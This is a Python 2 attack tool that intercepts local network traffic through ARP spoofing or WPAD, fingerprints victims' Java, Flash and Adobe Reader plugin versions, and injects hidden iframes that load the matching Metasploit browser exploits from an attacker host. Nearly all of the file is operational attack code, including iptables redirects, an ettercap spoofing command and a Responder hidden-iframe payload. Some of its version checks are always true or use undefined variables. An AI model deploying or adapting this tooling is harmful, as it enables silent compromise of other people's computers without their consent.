# -*- coding: utf-8 -*-
from threading import Thread
from SocketServer import ThreadingMixIn
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import string,cgi,time,urlparse,commands,os,subprocess
from os import curdir, sep
import sys

#If the fingerprintOnly options is set to True, the other options below is ignored
fingerprintOnly=True
javaSelfsigned=False
runFlash=True
runJava=True
runReader=True
msfPath="/pentest/metasploit-framework"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if 'fingerprint.html' in self.path:
                f = open(curdir + sep + self.path, 'rb')
		self.send_response(200)
                self.send_header('Content-type',    'text/html')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()
                return		
        if 'fingerprint_exploit.html' in self.path:
                f = open(curdir + sep + self.path, 'rb')
		self.send_response(200)
                self.send_header('Content-type',    'text/html')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()
                return		
        if 'jquery.min.js' in self.path:
                f = open(curdir + sep + self.path, 'rb')
		self.send_response(200)
                self.send_header('Content-type',    'text/html')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()
                return		
        else:
            parsed_path = urlparse.urlparse(self.path)
            message_parts = [
                    'client_address=%s (%s)' % (self.client_address,
                                                self.address_string()),
                    'query=%s' % parsed_path.query,
                    ]
            for name, value in sorted(self.headers.items()):
                message_parts.append('%s=%s' % (name, value.rstrip()))
            message_parts.append('')
            message = '\r\n'.join(message_parts)
            self.send_response(200)
            self.end_headers()

            for msg in message_parts:
		vulnText=''
		if "query=" in msg and "&" in msg:
			for msg1 in message_parts:
		             if 'client_address' in msg1:
       		             	print bcolors.OKGREEN+"Target: "+bcolors.ENDC+msg1.split(") (")[1].strip(")")
                   	pluginVer = msg.replace("query=","").split('&')
		    	for i in pluginVer:
				if i:
					pdtName,pdtVer = i.split("=")

					if(pdtName=='reader'):
						pdtver0 = int((pdtVer.split(','))[0])
						pdtver1 = int((pdtVer.split(','))[1])
						pdtver2 = int((pdtVer.split(','))[2])
						pdtver01 = str(pdtver0)+','+str(pdtver1)

						if(pdtver01=='9,3' or pdtVer=='9,3,4'):
							vulnText += '\nadobe_cooltype_sing'
						if(pdtVer=='9,1,0'):
							vulnText += '\nadobe_flatedecode_predictor02'
						if(pdtVer=='8,0,0' or pdtVer=='8,1,2' or pdtVer=='9,0,0'):
							vulnText += '\nadobe_geticon'
						if(pdtVer=='8,1,1' or pdtVer=='9,1,0' or pdtver01=='9,2'):
							vulnText += '\nadobe_media_newplayer'
						if(pdtVer=='11,0,2' or pdtVer=='10,0,4'):
							vulnText += '\nadobe_toolbutton'
						if(pdtVer=='8,1,2'):
							vulnText += '\nadobe_utilprintf'
	 					pdtVer = pdtVer.replace(",",".")
						print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
						#print bcolors.OKGREEN+'***** Exploits Available *****'+bcolors.ENDC+'\t'+vulnText
						#print bcolors.OKGREEN+'******************************'+bcolors.ENDC
					elif(pdtName=='java'):
						pdtverMaj0 = int((pdtVer.split(','))[0])
						pdtverMaj1 = int((pdtVer.split(','))[1])
						pdtverMaj2 = int((pdtVer.split(','))[2])
						pdtverMaj01 = str(pdtverMaj0)+'.'+str(pdtverMaj1)
						pdtverMaj = str(pdtverMaj0)+'.'+str(pdtverMaj1)+'.'+str(pdtverMaj2)
						pdtverMin  = int((pdtVer.split(','))[3])
						pdtverJoin = str(pdtverMaj0)+'.'+str(pdtverMaj1)+'.'+str(pdtverMaj2)+'.'+str(pdtverMin)
	
						if(pdtverMaj=='1.7.0'):
							if(pdtverMin>0 and pdtverMin<22):
								vulnText += '\njava_jre17_reflection_types'
							if(pdtverMin>-1 and pdtverMin<12):
								vulnText += '\njava_jre17_provider_skeleton'
							if(pdtverMin>0 and pdtverMin<12):
								vulnText += '\njava_jre17_jmxbean_2'
							if(pdtverMin>0 and pdtverMin<8):
								vulnText += '\njava_jre17_method_handle'
							if(pdtverMin==4):
								vulnText += '\njava_verifier_field_access'
							if(pdtverMin>0 and pdtverMin<22):
								vulnText += '\njava_storeimagearray'
						if(pdtverMaj=='1.6.0'):
							if(pdtverMin>0 and pdtverMin<28):
								vulnText += '\njava_rhino'
							if(pdtverMin>3 and pdtverMin<28):
								vulnText += '\njava_jre17_method_handle'				
							if(pdtverMin==32):
								vulnText += '\njava_verifier_field_access'
							if(pdtverMin>0 and pdtverMin<19):
								vulnText += '\njava_trusted_chain'
							if(pdtverMin>21 and pdtverMin<46):
								vulnText += '\njava_storeimagearray'
							if(pdtverMin>0 and pdtverMin<17):
								vulnText += '\njava_setdifficm_bof'
							if(pdtverMin>-1 and pdtverMin<19):
								vulnText += '\nava_rmi_connection_impl'
						if(pdtverMaj=='1.5.0'):
							if(pdtverMin==35):
								vulnText += '\njava_verifier_field_access'
							if(pdtverMin>0 and pdtverMin<24):
								vulnText += '\njava_trusted_chain'
							if(pdtverMin>3 and pdtverMin<46):
								vulnText += '\njava_storeimagearray'
							if(pdtverMin>0 and pdtverMin<22):
								vulnText += '\njava_setdifficm_bof'
						if(pdtverMaj=='1.4.2'):
							if(pdtverMin>0 and pdtverMin<10):
								vulnText += '\njava_trusted_chain'
						if(pdtverMaj=='1.4.0'):
							if(pdtverMin>0 and pdtverMin<25):
								vulnText += '\njava_setdifficm_bof'
	
	 					pdtVer = pdtVer.replace(",",".")
						print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
						#print bcolors.OKGREEN+'***** Exploits Available *****'+bcolors.ENDC+'\t'+vulnText
						#print bcolors.OKGREEN+'******************************'+bcolors.ENDC
					elif(pdtName=='flash'):
						pdtverMaj0 = int((pdtVer.split(','))[0])
						pdtverMaj1 = int((pdtVer.split(','))[1])
						pdtverMaj2 = int((pdtVer.split(','))[2])
						pdtverMaj01 = str(pdtverMaj0)+'.'+str(pdtverMaj1)
						pdtverMin  = int((pdtVer.split(','))[3])
						pdtverJoin = str(pdtverMaj0)+'.'+str(pdtverMaj1)+'.'+str(pdtverMaj2)+'.'+str(pdtverMin)

						if(pdtVer=='11,7,700,202' or pdtVer=='11.3.372.94'):
							vulnText += '\nadobe_flash_avm2 '
						if(pdtverMaj01=='11,7' or pdtverMaj01 =='11,8' or (pdtverMaj01=='11,9' and int(pdtverMaj2)<=900)):						
							vulnText += '\nadobe_flash_filters_type_confusion'
						if(pdtVer=='10,3,183,15' or pdtverMaj01=='11.0'or pdtverMaj01=='11.1'):
							vulnText += '\nadobe_flash_mp4_cprt'
						if(pdtVer=='11,2,202,233'or pdtVer=='11,3,300,268' or pdtVer=='11,3,300,265' or pdtVer=='11,3,300,257'):
							vulnText += '\nadobe_flash_otf_font'
						if((pdtverMaj0>=11 and pdtverMaj0<=12) or (pdtverMaj0==13 and pdtverMaj1==0 and pdtverMaj2<=182)):
							vulnText += '\nadobe_flash_pixel_bender_bof'
						if(pdtverMaj01=='11,5' and ((pdtverMaj2==502 and pdtVerMin<149) or (pdtverMaj2<502))):
							vulnText += '\nadobe_flash_regex_value'
						if(pdtVer=='11,2,202,228'):
							vulnText += '\nadobe_flash_rtmp'
						if(pdtverMaj0==10):
							vulnText += '\nadobe_flash_sps'
						if(pdtverMaj0<10 or (pdtverMaj0>10 and  pdtverMaj1<=3) or (pdtVer=='10,3,185,23' or pdtVer=='10,3,185,21' or pdtVer=='10,3,181,23' or pdtVer=='10,3,181,16' or pdtVer=='10,3,181,14' or pdtVer=='10,3,185,21' or pdtVer=='10,3,185,23')):
							vulnText += '\nadobe_flashplayer_arrayindexing'
						if(pdtverMaj0>=9 or pdtverMaj0<10 or (pdtverMaj0==10 and pdtverMaj1<=2) or pdtVer=='10,2,154,13' or pdtVer=='10,2,152,33' or pdtVer=='10,2,152,32' or pdtVer=='10,2,152,0'):
							vulnText += '\nadobe_flashplayer_avm'
						if(pdtVer=="10,0,42,34" or pdtVer=="10,0,45,2"):
							vulnText += '\nadobe_flashplayer_newfunction'
						if(pdtverMaj0>=9 or pdtverMaj0<10 or (pdtverMaj0==10 and pdtverMaj1<=2) or pdtVer=='10,2,156,12' or pdtVer=='10,2,154,25' or pdtVer=='10,2,154,13' or pdtVer=='10,2,152,33' or pdtVer=='10,2,152,32' or pdtVer=='10,2,152,0'):
							vulnText += '\nadobe_flashplayer_flash10o'
	 					pdtVer = pdtVer.replace(",",".")
						print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
					else:
	 					pdtVer = pdtVer.replace(",",".")
						print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
			print bcolors.OKGREEN+'***** Exploits Available *****'+bcolors.ENDC
			print '\t'+vulnText
			print bcolors.OKGREEN+'******************************'+bcolors.ENDC
            return

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""     

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def getIP(iface):
    cmd = "ifconfig "+iface+" | grep 'inet ' | awk '{print $2}' | cut -d':' -f 2"
    ipAddr = commands.getstatusoutput(cmd)[1]
    return ipAddr

def modifyHTML(filename):
    content = []
    contentExploit = []
    
    ipAddr = getIP('eth0')
    with open(filename) as f:
    	for line in f:
		if '$.get(' in line:
			replaceLine = "		$.get('http://"+ipAddr+":9090/scan?'+ params + '&' + browserInfo + '&' + osInfo, function(data) {\n"
			content.append(replaceLine)
			contentExploit.append(replaceLine)
		elif 'iframe id="signed"' in line:
			replaceLine = '<iframe id="signed" src="http://'+ipAddr+':9090/blank.html"'
			content.append(replaceLine)
			contentExploit.append(replaceLine)
		elif 'iframe id="exploit"' in line:
			replaceLine = '<iframe id="exploit" src="http://'+ipAddr+':9090/blank.html"'
			content.append(replaceLine)
			contentExploit.append(replaceLine)
		elif line.strip()=="//plugins":
				content.append(line)	
				content.append("var iframe = document.getElementById('exploit');\n")
				content.append("url = 'http://"+ipAddr+":9090/fingerprint_exploit.html';\n")
				content.append("iframe.setAttribute('src',url);\n")
				content.append("var browserInfo = CollectBrowser();\n")
				content.append("var osInfo = CollectOS();\n")
				#content.append("iframe.contentDocument.location.reload(true);\n")
			
				contentExploit.append(line)
				contentExploit.append("var iframe = document.getElementById('exploit');\n")
				contentExploit.append("var iframesigned = document.getElementById('signed');\n")
				contentExploit.append("verSplit=BrowserScanHostDetails[ao[i]].split(',');\n")
				contentExploit.append("verFull=BrowserScanHostDetails[ao[i]];\n")

				contentExploit.append("verMaj = verSplit[0]+','+verSplit[1]+','+verSplit[2];\n")
				contentExploit.append("verFullJoin = verSplit[0]+verSplit[1]+verSplit[2]+verSplit[3];\n")
				contentExploit.append("verMaj1 = verSplit[0];\n")
				contentExploit.append("verMaj12 = verSplit[0]+','+verSplit[1];\n")
				contentExploit.append("verMaj12Join = verSplit[0]+verSplit[1];\n")
				contentExploit.append("verMaj2 = verSplit[1];\n")
				contentExploit.append("verMin = verSplit[3];\n")
				contentExploit.append("var plugin = plugins[ao[i]];\n")

				#Adobe Flash
				if runFlash==True and fingerprintOnly==False:
					contentExploit.append("url = 'http://"+ipAddr+":8094/adobe_flash_avm2';\n")
					contentExploit.append("if(plugin=='flash' && verFull=='11,7,700,202' || verFull=='11.3.372.94'){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}\n")
	
					contentExploit.append("url = 'http://"+ipAddr+":8095/adobe_flash_filters_type_confusion';\n")
					contentExploit.append("if(plugin=='flash' && (verMaj12=='11,7' || verMaj12=='11,8' || (verMaj12=='11,9' && verMaj3<=900))){iframe.setAttribute('src',url);}\n")

					contentExploit.append("url = 'http://"+ipAddr+":8096/adobe_flash_mp4_cprt';\n")	
					contentExploit.append("if(plugin=='flash' && (verFull=='10,3,183,15' || verMaj12=='11,0' || verMaj12=='11,1')){iframe.setAttribute('src',url);}\n")

					contentExploit.append("url = 'http://"+ipAddr+":8097/e1';\n")
					contentExploit.append("if(plugin=='flash' && (verFull=='11,2,202,233' || verFull=='11,3,300,268' || verFull=='11,3,300,265' || verFull=='11,3,300,257')){iframe.setAttribute('src',url);}\n")
			
					contentExploit.append("url = 'http://"+ipAddr+":8098/adobe_flash_pixel_bender_bof';\n")
					contentExploit.append("if((verMaj1>='11' && verMaj1<=12) || (verMaj1=='13' && verMaj2=='0' && verMaj3=='0' && verMaj4<=182)){iframe.setAttribute('src',url);}\n")

					contentExploit.append("url = 'http://"+ipAddr+":8099/adobe_flash_regex_value';\n")
					#contentExploit.append("if(plugin=='flash' && (verMaj12=='11,5' && verFullJoin<11.5.502.149)){iframe.setAttribute('src',url);}\n")

					contentExploit.append("url = 'http://"+ipAddr+":8100/adobe_flash_rtmp';\n")
					contentExploit.append("if(plugin=='flash' && verFull=='11,2,202,228'){iframe.setAttribute('src',url);}\n")
			
					contentExploit.append("url = 'http://"+ipAddr+":8101/adobe_flash_sps';\n")
					contentExploit.append("if(plugin=='flash' && verMaj1=='10'){iframe.setAttribute('src',url);}\n")

					contentExploit.append("url = 'http://"+ipAddr+":8102/adobe_flashplayer_arrayindexing';\n")
					contentExploit.append("if(plugin=='flash' && (verMaj1<10) || (verMaj1=='10' && verMaj2<=3) || (verFull=='10,3,185,23' || verFull=='10,3,185,21'|| verFull=='10,3,181,23' || verFull=='10,3,181,16' || verFull=='10,3,181,14' || verFull=='10,3,185,21' || verFull=='10,3,185,23')){iframe.setAttribute('src',url);}\n")

					contentExploit.append("url = 'http://"+ipAddr+":8103/adobe_flashplayer_avm';\n")
					contentExploit.append("if(plugin=='flash' && (verMaj1>=9 || verMaj1<10 || (verMaj1=='10' && verMaj2<=2)) || (verFull=='10,2,154,13' || verFull=='10,2,152,33'|| verFull=='10,2,152,32' || verFull=='10,2,152,0')){iframe.setAttribute('src',url);}\n")

					contentExploit.append("url = 'http://"+ipAddr+":8105/adobe_flashplayer_newfunction';\n")
					contentExploit.append("if(plugin=='flash' && ((verFull=='10,0,42,34' || verFull=='10,0,45,2' ))){iframe.setAttribute('src',url);}\n")

					contentExploit.append("url = 'http://"+ipAddr+":8104/adobe_flashplayer_flash10o';\n")
					contentExploit.append("if(plugin=='flash' && (verMaj1>=9 || verMaj1<10 || (verMaj1=='10' && verMaj2<=2) || (verFull=='10,2,156,12'||verFull=='10,2,154,25'||verFull=='10,2,154,13'||verFull=='10,2,152,33'				|| verFull=='10,2,152,32' || verFull=='10,2,152,0' ))) {iframe.setAttribute('src',url);}\n")

				#Java
				if runJava==True and fingerprintOnly==False:
					contentExploit.append("url = 'http://172.16.91.187:8085/java_jre17_reflection_types';\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					contentExploit.append("url = 'http://172.16.91.187:8084/java_jre17_provider_skeleton';\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>-1 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					contentExploit.append("url = 'http://172.16.91.187:8082/java_jre17_jmxbean_2';\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					contentExploit.append("url = 'http://172.16.91.187:8086/java_rhino';\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					contentExploit.append("url = 'http://172.16.91.187:8083/java_jre17_method_handle';\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<8){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>3 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					contentExploit.append("url = 'http://172.16.91.187:8092/java_verifier_field_access';\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin==32){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin==4){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin==35){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					contentExploit.append("url = 'http://172.16.91.187:8091/java_trusted_chain';\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>0 && verMin<24){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,4,2'){if(verMin>0 && verMin<10){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					contentExploit.append("url = 'http://172.16.91.187:8090/java_storeimagearray';\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>35 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>21 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
	
					contentExploit.append("url = 'http://172.16.91.187:8088/java_setdifficm_bof';\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<17){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,4,0'){if(verMin>0 && verMin<25){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
				
					contentExploit.append("url = 'http://172.16.91.187:8087/java_rmi_connection_impl';\n")
					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>-1 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					#If all else fails, let's use the java signed applet
					if(javaSelfsigned==True):	
						contentExploit.append("url = 'http://172.16.91.187:8089/java_signed_applet';\n")
						contentExploit.append("if(plugin=='java'){{iframesigned.setAttribute('src',url);iframesigned.contentDocument.location.reload(true);}};\n")	

				#Adobe Reader			
				if runReader==True and fingerprintOnly==False:
					contentExploit.append("url = 'http://172.16.91.187:8093/adobe_cooltype_sing';\n")
					contentExploit.append("if(plugin=='reader' && ((verMaj1=='9' && verMaj2=='3') || verMaj=='9,3,4')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			
					contentExploit.append("url = 'http://172.16.91.187:8106/adobe_flatedecode_predictor02';\n")
					contentExploit.append("if(plugin=='reader' && verMaj=='9,1,0'){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					contentExploit.append("url = 'http://172.16.91.187:8107/adobe_geticon';\n")
					contentExploit.append("if(plugin=='reader' && (verMaj=='8,0,0' || verMaj=='8,1,2' || verMaj=='9,0,0')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
				
					contentExploit.append("url = 'http://172.16.91.187:8109/adobe_media_newplayer';\n")
					contentExploit.append("if(plugin=='reader' && (verMaj=='8,1,1' || verMaj=='9,1,0' || (verMaj1=='9' && verMaj2=='2'))){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					contentExploit.append("url = 'http://172.16.91.187:8110/adobe_toolbutton';\n")
					contentExploit.append("if(plugin=='reader' && (verMaj=='11,0,2' || verMaj=='10,0,4')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

					contentExploit.append("url = 'http://172.16.91.187:8111/adobe_utilprintf';\n")
					contentExploit.append("if(plugin=='reader' && verMaj=='8,1,2'){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

		else:
			content.append(line)
			contentExploit.append(line)
    fo = open("fingerprint.html", "w+") 
    fo.writelines(content)
    fo.close()
    fo1 = open("fingerprint_exploit.html", "w+") 
    fo1.writelines(contentExploit)
    fo1.close()
def setupForwarding():
	cmd = "sysctl -w net.ipv4.ip_forward=1"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "echo '1' > /proc/sys/net/ipv4/ip_forward"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080"

def startMITMproxy():
	setupForwarding()
	#cmd = 'screen -list | grep msfconsole'
	#result = commands.getstatusoutput(cmd)[1]
	#if 'msfconsole' not in result:
	#	cmd = 'screen -dmS msfconsole'
	#	subprocess.Popen(cmd, shell=True)
	#time.sleep(2)
	#cmdStr = '/bin/bash --login'
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)
	
	#time.sleep(2)
	#cmdStr = 'rvm use 1.9.3-p484'
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)

	print "[*] Run the below command in another terminal"
	cmdStr = 'cd '+msfPath
        print bcolors.OKGREEN+cmdStr+bcolors.ENDC
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)

	cmdStr = './msfconsole -r '+os.getcwd()+'/msfrun.rc'
        print bcolors.OKGREEN+cmdStr+bcolors.ENDC
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)

	#time.sleep(5)
	#cmdStr = 'resource '+os.getcwd()+'/msfrun.rc'
	#print cmdStr
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)
	
	cmd = 'screen -list | grep mitm'
	result = commands.getstatusoutput(cmd)[1]
	if 'mitm' not in result:
		cmd = 'screen -dmS mitm'
		subprocess.Popen(cmd, shell=True)
	cmdStr = 'cd '+os.getcwd()
	#print cmdStr
	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
	subprocess.Popen(cmd, shell=True)
        ipAddr = getIP('eth0')
	cmdStr = 'python iframe_injector http://'+ipAddr+':9090/fingerprint.html'
	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
	#print cmdStr
	subprocess.Popen(cmd, shell=True)
	print 

def main():
    try:
	#Get Gateway
	cmd = "route -n | awk '$2 ~/[1-9]+/ {print $2;}'"
	gatewayIPList = commands.getstatusoutput(cmd)[1]
	gatewayIP = gatewayIPList.split("\n")[0]
        server = ThreadedHTTPServer(('', 9090), Handler)
        print 'Started httpserver...'
	print bcolors.OKGREEN+"[Fingerprints and Exploits Browser Plugins (Java/Flash/Reader) via ARP Spoofing/WPAD]\n"+bcolors.ENDC
	startMITMproxy()
	modifyHTML('fingerprint_template.html')
	print "[*] If you want to use ARP spoofing, run the command in another terminal (replace X with the target host)"
	ipSplit=gatewayIP.split(".")
	subnetStr=ipSplit[0]+'.'+ipSplit[1]+'.'+ipSplit[2]+'.X'
	print bcolors.OKGREEN+"ettercap -T -q -M ARP /"+subnetStr+"/  /"+gatewayIP+"/"+bcolors.ENDC
	print 

	ipAddr = getIP('eth0')
	print "[*] If you want to use WPAD with Responder, replace the below line in Responder.conf"
	print bcolors.OKGREEN+"HTMLToServe = <html><head></head><body><iframe height='0' width='0' src='http://"+ipAddr+":9090/fingerprint.html' style='visibility:hidden;display:none'></iframe></body></html>"+bcolors.ENDC

        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down server'
	cmd = "killall screen"
	#subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
        server.socket.close()

if __name__ == '__main__':
    main()
